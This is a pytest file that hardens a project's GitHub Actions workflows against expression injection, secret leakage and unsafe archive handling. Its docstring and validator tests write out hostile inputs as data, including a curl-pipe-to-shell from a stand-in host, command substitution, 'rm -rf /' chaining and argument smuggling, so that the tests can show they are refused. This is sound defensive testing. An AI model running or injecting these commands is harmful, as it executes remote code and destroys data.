"""Workflow inputs are data, and the dashboard's week input proves it.

`${{ inputs.week }}` written inside a `run:` block is expanded by the runner
BEFORE the shell parses the script, so whatever was typed into the dispatch
box is spliced into a command line. `3; curl evil.sh | sh` is a legal string
in that box. Only a collaborator can dispatch it (the repository being
public changes who can read, not who can run), which lowers the odds and
changes nothing about the mechanism.

Two things are pinned here. First, textually: no `run:` block in any workflow
may contain a `${{ ... }}` expansion at all — the same check a workflow
linter makes, kept in the suite so it runs on every change rather than when
somebody remembers. Values reach a script through `env:`, where the runner
puts them in the environment instead of in the command. Second, behaviourally:
the validator the dashboard actually uses refuses everything that is not a
bare in-range integer, and echoes the offending text as a quoted value.

No YAML parser is used. The property is about the file's TEXT, and pyyaml is
not a declared dependency of this project.
"""
from __future__ import annotations

import importlib.util
import json
import os
import random
import re
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
WORKFLOWS = sorted((ROOT / ".github" / "workflows").glob("*.yml"))
EXPANSION = re.compile(r"\$\{\{")


def _load(name: str, rel: str):
    spec = importlib.util.spec_from_file_location(name, ROOT / rel)
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


CLI = _load("workflow_dashboard_cli", "scripts/weekly/dashboard.py")


def _run_blocks(text: str) -> list[tuple[int, str]]:
    """Every `run:` script in a workflow, as (line number, script).

    Indentation-scoped: the block is the rest of the `run:` line plus every
    following line indented deeper than it (blank lines carry through).
    """
    lines = text.splitlines()
    blocks: list[tuple[int, str]] = []
    i = 0
    while i < len(lines):
        m = re.match(r"^(\s*)run:(.*)$", lines[i])
        if not m:
            i += 1
            continue
        indent, rest = len(m.group(1)), m.group(2).strip()
        body = [] if rest in ("|", ">", "|-", ">-", "") else [rest]
        start = i + 1
        j = start
        while j < len(lines):
            line = lines[j]
            if line.strip() and (len(line) - len(line.lstrip())) <= indent:
                break
            body.append(line)
            j += 1
        blocks.append((i + 1, "\n".join(body)))
        i = j
    return blocks


def test_the_workflows_have_run_blocks_to_check():
    assert WORKFLOWS, "no workflows found — this test would pass vacuously"
    found = sum(len(_run_blocks(w.read_text("utf-8"))) for w in WORKFLOWS)
    assert found >= 5, f"only {found} run blocks parsed; the parser is wrong"


@pytest.mark.parametrize("workflow", WORKFLOWS, ids=lambda p: p.name)
def test_no_workflow_expands_an_expression_inside_a_shell_script(workflow):
    offenders = [(n, b) for n, b in _run_blocks(workflow.read_text("utf-8"))
                 if EXPANSION.search(b)]
    assert not offenders, (
        f"{workflow.name}: `${{{{ ... }}}}` inside a run: block at line(s) "
        f"{[n for n, _ in offenders]} — the runner substitutes it before the "
        f"shell parses the script. Pass the value through `env:` instead.")


def test_the_dispatched_week_reaches_python_through_the_environment():
    text = (ROOT / ".github" / "workflows" / "dashboard-artifact.yml").read_text("utf-8")
    assert "GRIDIRON_WEEK: ${{ inputs.week }}" in text, \
        "the week input must be bound to an env var, not spliced into a command"
    assert CLI.WEEK_ENV == "GRIDIRON_WEEK"
    # and the render command itself is a constant string
    render = next(b for _n, b in _run_blocks(text) if "weekly/dashboard.py" in b)
    assert render.strip() == "python scripts/weekly/dashboard.py --write"


def test_the_run_summary_never_claims_a_page_that_was_not_built():
    """It used to print "Built." unconditionally — on a run where the render
    step had failed, directly above its own line "No dashboard was written."
    A summary that contradicts the job it summarises is worse than none.
    """
    text = (ROOT / ".github" / "workflows" / "dashboard-artifact.yml").read_text("utf-8")
    summary = next(b for _n, b in _run_blocks(text) if "GITHUB_STEP_SUMMARY" in b)
    assert "RENDER_OUTCOME" in summary, \
        "the summary must read the render step's actual outcome"
    assert "RENDER_OUTCOME: ${{ steps.render.outcome }}" in text
    assert "id: render" in text, "the render step needs an id to be quotable"
    # "Built" may only be reachable under the success branch.
    built = summary.index("Built.")
    guard = summary.index('if [ "${RENDER_OUTCOME}" = "success" ]')
    assert guard < built, "the claim must sit inside the success branch"
    assert "NOT BUILT" in summary, "and the failure branch must say so plainly"


def test_the_summary_reports_the_outcome_of_every_step_that_can_fail_quietly():
    """Both refresh steps are continue-on-error, so their failure is silent
    unless the summary names it. So is the render step now that a failed
    refresh no longer stops the page being built from carried inputs."""
    text = (ROOT / ".github" / "workflows" / "dashboard-artifact.yml").read_text("utf-8")
    for step in ("sleeper", "nflverse", "render"):
        assert f"${{{{ steps.{step}.outcome }}}}" in text, step


def test_the_carryover_steps_move_inputs_as_well_as_records():
    """`continue-on-error` on the refresh steps is an empty promise if the
    runner has no cache to fall back on: there is nothing to render FROM."""
    text = (ROOT / ".github" / "workflows" / "dashboard-artifact.yml").read_text("utf-8")
    carry = [b for _n, b in _run_blocks(text) if "cloud/carryover.py" in b]
    assert len(carry) == 2, "one restore and one publish"
    # Neither may opt out of the input carry.
    assert not any("--no-inputs" in b for b in carry)
    assert any(b.strip().startswith("python scripts/cloud/carryover.py restore")
               for b in carry)
    assert any(b.strip().startswith("python scripts/cloud/carryover.py publish")
               for b in carry)


# ----------------------------------------------------------- the validator

@pytest.mark.parametrize("raw", ["", "   ", None])
def test_no_week_given_means_no_week(raw):
    assert CLI.week_from_env(raw) is None


@pytest.mark.parametrize("raw,want", [("1", 1), ("3", 3), ("18", 18), ("22", 22),
                                      ("03", 3), (" 7 ", 7), ("3\n", 3)])
def test_a_plain_in_range_integer_is_the_only_thing_accepted(raw, want):
    assert CLI.week_from_env(raw) == want


@pytest.mark.parametrize("raw", [
    "3; curl evil.sh | sh",       # command chaining
    "$(whoami)",                  # command substitution
    "`id`",                       # backtick substitution
    "3 && rm -rf /",              # conditional chaining
    "3 | tee /etc/passwd",        # pipe
    "3\nrm -rf /",                # newline injection
    "--week=3 --archive-root=/", # argument smuggling
    "0", "-1", "23", "999",       # out of range
    "1e3", "3.0", "0x3", "three", "٣",   # not a plain ASCII integer
])
def test_everything_else_is_refused_as_data(raw):
    with pytest.raises(SystemExit) as exc:
        CLI.week_from_env(raw)
    message = str(exc.value)
    assert "REFUSING" in message
    # the offending text is echoed as a quoted value, never bare
    assert repr(raw) in message or "outside weeks" in message


def test_a_refused_week_stops_the_run_rather_than_falling_back():
    """Falling back to the snapshot's week would render a confident page for
    a week nobody asked for, off an input that was already malformed."""
    with pytest.raises(SystemExit):
        CLI.week_from_env("3; rm -rf /")


# ------------------------------------------------- the prop collector workflow
#
# props-collect.yml handles an API credential and data whose terms forbid
# redistribution, in a repository whose logs, artifacts and caches are
# public. Each property below is part of what keeps it inside those terms.

PROPS = ROOT / ".github" / "workflows" / "props-collect.yml"
DERIVED_PATH = "data/research/cache/props/derived"
USES = re.compile(r"^\s*-?\s*uses:\s*(\S+)")


def _props() -> str:
    return PROPS.read_text("utf-8")


def _ancestors(lines: list[str], i: int) -> list[str]:
    """The stripped lines that enclose line i, innermost first (YAML by
    indentation: each is the nearest earlier line indented less)."""
    out, depth = [], len(lines[i]) - len(lines[i].lstrip())
    for j in range(i - 1, -1, -1):
        line = lines[j]
        if not line.strip() or line.lstrip().startswith("#"):
            continue
        ind = len(line) - len(line.lstrip())
        if ind < depth:
            out.append(line.strip())
            depth = ind
    return out


def _steps(text: str) -> list[str]:
    """Each step of a workflow as its block of text."""
    return [("- name:" + b) for b in text.split("- name:")[1:]]


def test_the_collector_runs_only_on_a_schedule_or_by_hand_and_only_when_enabled():
    text = _props()
    on = text.split("\non:", 1)[1].split("\npermissions:", 1)[0]
    assert "workflow_dispatch:" in on and "schedule:" in on
    for trigger in ("pull_request", "pull_request_target", "push:", "workflow_run"):
        assert trigger not in on, f"props-collect.yml must not run on {trigger}"
    assert "if: vars.GRIDIRON_PROPS_ENABLED == 'true'" in text
    assert "permissions:\n  contents: read" in text
    cron = re.findall(r"cron: '([^']+)'", text)
    assert len(cron) == 1
    minute, *rest = cron[0].split()
    assert rest == ["*", "*", "*", "*"], "hourly"
    assert minute.isdigit() and int(minute) % 15 != 0, "off the quarter hours"


@pytest.mark.parametrize("workflow", WORKFLOWS, ids=lambda p: p.name)
def test_every_action_is_pinned_to_a_full_commit_sha(workflow):
    for line in workflow.read_text("utf-8").splitlines():
        m = USES.match(line)
        if m:
            assert re.fullmatch(r"[\w.-]+/[\w./-]+@[0-9a-f]{40}", m.group(1)), \
                f"{workflow.name}: {m.group(1)} is not pinned to a commit SHA"


def test_secrets_reach_only_step_level_env_and_the_key_one_step():
    lines = _props().splitlines()
    hits = [i for i, line in enumerate(lines) if "secrets." in line and "${{" in line]
    assert hits, "the parser found no secret at all"
    for i in hits:
        chain = _ancestors(lines, i)
        assert chain[0] == "env:", f"line {i + 1}: a secret outside an env: block"
        assert chain[1].startswith("- "), f"line {i + 1}: a secret in a job- or workflow-level env"
    key_steps = [s for s in _steps(_props()) if "secrets.GRIDIRON_ODDS_API_KEY" in s]
    assert len(key_steps) == 1, "exactly one step holds the API key"
    assert "run: python scripts/ingest/pull_props.py\n" in key_steps[0]
    for s in _steps(_props()):
        if "secrets." in s:
            assert "uses:" not in s, "a secret handed to an action's inputs"


def test_raw_odds_never_leave_the_runner_unencrypted():
    text = _props()
    actions = [m.group(1) for m in map(USES.match, text.splitlines()) if m]
    assert actions, "the parser found no action at all"
    assert not [a for a in actions if "upload" in a], \
        "no artifact of any kind: raw odds may not be redistributed"
    enc = [line for line in text.splitlines() if "openssl enc" in line]
    assert len(enc) == 2, "one decrypt and one encrypt"
    for line in enc:
        for flag in ("-aes-256-cbc", "-pbkdf2", "-iter 200000",
                     "-pass env:GRIDIRON_ODDS_ARCHIVE_KEY"):
            assert flag in line, f"openssl without {flag}"
        assert "-pass pass:" not in line and " -k " not in line and " -K " not in line
    # every cache path is the encrypted vault or the derived folder, never raw/
    paths = re.findall(r"^\s*path:\s*(\S+)\s*$", text, flags=re.M)
    assert set(paths) == {".props-vault", DERIVED_PATH}
    assert "gridiron-props-vault-" in text and "gridiron-props-derived-" in text
    # the plaintext goes, whatever happened above (the decrypt step's own
    # cleanup of a half-extracted archive is not this: it runs only there)
    always = [s for s in _steps(text) if "\n        if: always()\n" in s and "rm -rf" in s]
    assert any('"$PROPS_DIR/raw"' in s for s in always)


def test_the_summary_says_when_nothing_raw_is_kept():
    summary = next(b for _n, b in _run_blocks(_props()) if "GITHUB_STEP_SUMMARY" in b
                   and "Prop market collector" in b)
    assert "nothing raw is kept between runs" in summary
    assert "VAULT_KEY_PRESENT: ${{ steps.vaultkey.outputs.present }}" in _props()


def test_the_dashboard_restores_the_derived_cache_once_and_never_saves_it():
    text = (ROOT / ".github" / "workflows" / "dashboard-artifact.yml").read_text("utf-8")
    steps = [s for s in _steps(text) if DERIVED_PATH in s]
    assert len(steps) == 1, "exactly one step touches the derived prop cache"
    step = steps[0]
    assert "actions/cache/restore@" in step and "actions/cache/save" not in step
    assert "restore-keys: |\n            gridiron-props-derived-" in step
    # the same path string as the collector's save: a cache's version is
    # computed from its paths, so any other spelling would never restore
    save = next(s for s in _steps(_props()) if "actions/cache/save@" in s and DERIVED_PATH in s)
    assert f"path: {DERIVED_PATH}\n" in save and f"path: {DERIVED_PATH}\n" in step
    assert "secrets." not in step


def test_every_openssl_pipeline_runs_under_pipefail():
    """Without pipefail a pipeline's status is its LAST command's: a tar
    that fails half-way would leave openssl encrypting a truncated stream
    that then replaces the good archive, and a failed decrypt could hide
    behind a tar that exited cleanly."""
    steps = [s for s in _steps(_props()) if "openssl enc" in s]
    assert len(steps) == 2
    for s in steps:
        run = s.split("run: |", 1)[1]
        assert run.lstrip().startswith("set -euo pipefail"), s.splitlines()[0]


def test_the_summary_reports_every_step_that_can_fail_quietly():
    """A continue-on-error step fails in silence unless the summary names
    its outcome (the dashboard's rule, extended to the collector), and the
    archive's save is reported beside its encryption."""
    text = _props()
    quiet = [s for s in _steps(text) if "continue-on-error: true" in s]
    assert quiet, "the parser found no continue-on-error step"
    for s in quiet + [next(s for s in _steps(text) if "actions/cache/save@" in s
                           and ".props-vault" in s)]:
        m = re.search(r"^\s*id:\s*(\S+)\s*$", s, flags=re.M)
        assert m, f"{s.splitlines()[0]}: a step the summary must quote needs an id"
        assert f"${{{{ steps.{m.group(1)}.outcome }}}}" in text, m.group(1)


def _step(text: str, step_id: str) -> str:
    """The one step whose `id:` is `step_id`."""
    found = [s for s in _steps(text)
             if re.search(rf"^\s*id:\s*{re.escape(step_id)}\s*$", s, flags=re.M)]
    assert len(found) == 1, f"one step with id {step_id}"
    return found[0]


def test_an_archive_that_will_not_decrypt_stops_no_collecting_and_is_never_replaced():
    """A snapshot missed while the archive is unreadable can never be bought
    back (the free tier has no history). So a decrypt failure must not stop
    the run. It must only keep the archive it could not read from being read
    or replaced, and it must stay in sight. Under continue-on-error a failed
    step's CONCLUSION is 'success' and only its OUTCOME stays 'failure', so
    every gate on the archive must read the outcome."""
    text = _props()
    steps = _steps(text)
    decrypt, collect = _step(text, "decrypt"), _step(text, "collect")
    install = next(s for s in steps if "pip install" in s)
    assert "continue-on-error: true" in decrypt
    assert steps.index(decrypt) < steps.index(install) < steps.index(collect)
    for s in (install, collect):
        assert "steps.decrypt" not in s and "\n        if:" not in s, s.splitlines()[0]
    for sid in ("encrypt", "rank"):
        assert "steps.decrypt.outcome == 'success'" in _step(text, sid), sid
    assert "steps.encrypt.outcome == 'success'" in _step(text, "savevault")
    assert "steps.decrypt.conclusion" not in text
    # the summary names the failure, and the run still fails, last
    summary = next(b for _n, b in _run_blocks(text) if "Prop market collector" in b)
    assert '"${DECRYPT_OUTCOME}" = "failure"' in summary and "did not decrypt" in summary
    last = steps[-1]
    assert "if: always() && steps.decrypt.outcome == 'failure'" in last
    assert re.search(r"^\s*exit 1\s*$", last, flags=re.M)
    assert "continue-on-error" not in last


def _script(step: str) -> str:
    blocks = _run_blocks(step)
    assert len(blocks) == 1, step.splitlines()[0]
    return blocks[0][1]


def _posix_bash():
    """A bash that can run this host's workflow scripts, or None.

    On Windows the bash.exe in System32 (and in WindowsApps) is the WSL
    launcher: it runs in a separate Linux environment, or fails outright with
    no distro installed, and PowerShell's PATH puts it first. Skip those and
    take the next bash on PATH, else the Git Bash that ships beside git.exe.
    """
    if os.name != "nt":
        return shutil.which("bash")
    sysroot = os.path.normcase(os.environ.get("SystemRoot", "C:\\Windows"))
    for d in os.environ.get("PATH", "").split(os.pathsep):
        nd = os.path.normcase(d)
        if not d or nd.startswith(sysroot) or "windowsapps" in nd:
            continue
        found = shutil.which("bash", path=d)
        if found:
            return found
    git = shutil.which("git")
    if git:
        root = Path(git).resolve().parents[1]          # ...\Git\cmd\git.exe -> ...\Git
        for rel in ("usr/bin/bash.exe", "bin/bash.exe"):
            if (root / rel).is_file():
                return str(root / rel)
    return None


@pytest.mark.skipif(not (_posix_bash() and shutil.which("openssl") and shutil.which("tar")),
                    reason="needs a POSIX bash, openssl and tar")
def test_the_decrypt_step_restores_refuses_and_never_leaves_a_half_archive(tmp_path):
    """The workflow's own encrypt and decrypt scripts, run with a fictional
    key on fictional files. A good archive round-trips. A wrong key or a
    damaged file fails the step with state=unreadable, leaves no plaintext
    behind, and leaves the archive byte for byte as it was. A damaged file
    does half-extract before tar stops, so the cleanup is what removes it
    (shown by running the step without that line)."""
    text = _props()
    dirs = dict(re.findall(r"^\s+(PROPS_DIR|VAULT_DIR):\s*(\S+)\s*$", text, flags=re.M))
    assert set(dirs) == {"PROPS_DIR", "VAULT_DIR"}
    decrypt_sh, encrypt_sh = _script(_step(text, "decrypt")), _script(_step(text, "encrypt"))
    cleanup = 'rm -rf "$PROPS_DIR/raw"'
    assert cleanup in decrypt_sh
    props, vault = tmp_path / dirs["PROPS_DIR"], tmp_path / dirs["VAULT_DIR"] / "raw.tar.gz.enc"
    week = props / "raw" / "season2026" / "week09"
    week.mkdir(parents=True)
    rng = random.Random(7)
    for i in range(40):      # incompressible padding: a cut file still holds whole members
        (week / f"2026_09_G{i:02d}__20261108T163000Z.json").write_text(
            json.dumps({"pad": rng.randbytes(2048).hex()}), encoding="utf-8")

    def files():
        return sorted(p.relative_to(props) for p in props.rglob("*") if p.is_file())

    def step(script, key):
        out = tmp_path / "github_output"
        out.write_text("", encoding="utf-8")
        bash = _posix_bash()
        path = os.environ.get("PATH", "/usr/bin:/bin")
        if os.name == "nt":
            # Use the tar and openssl that ship with that bash, as /usr/bin
            # supplies them on Linux; System32 has a different tar.
            path = os.path.dirname(bash) + os.pathsep + path
        env = {"PATH": path, "HOME": str(tmp_path),
               "GITHUB_OUTPUT": str(out), "GRIDIRON_ODDS_ARCHIVE_KEY": key, **dirs}
        done = subprocess.run([bash, "-e", "-c", script], cwd=tmp_path, env=env,
                              capture_output=True, text=True, timeout=120)
        return done.returncode, out.read_text(encoding="utf-8").strip()

    written = files()
    assert step(encrypt_sh, "fictional-key-one") == (0, "")
    shutil.rmtree(props / "raw")
    assert step(decrypt_sh, "fictional-key-one") == (0, "state=restored")
    assert files() == written
    sealed = vault.read_bytes()

    shutil.rmtree(props / "raw")
    code, state = step(decrypt_sh, "fictional-key-two")          # a re-created key
    assert code != 0 and state == "state=unreadable"
    assert not (props / "raw").exists() and vault.read_bytes() == sealed

    damaged = sealed[: len(sealed) // 2]                           # a damaged file
    vault.write_bytes(damaged)
    step(decrypt_sh.replace(cleanup, ":"), "fictional-key-one")
    assert files(), "the damaged file half-extracts, or this case proves nothing"
    shutil.rmtree(props / "raw")
    code, state = step(decrypt_sh, "fictional-key-one")
    assert code != 0 and state == "state=unreadable"
    assert not (props / "raw").exists() and vault.read_bytes() == damaged

    vault.unlink()                                                 # nothing cached yet
    assert step(decrypt_sh, "fictional-key-one") == (0, "state=empty")
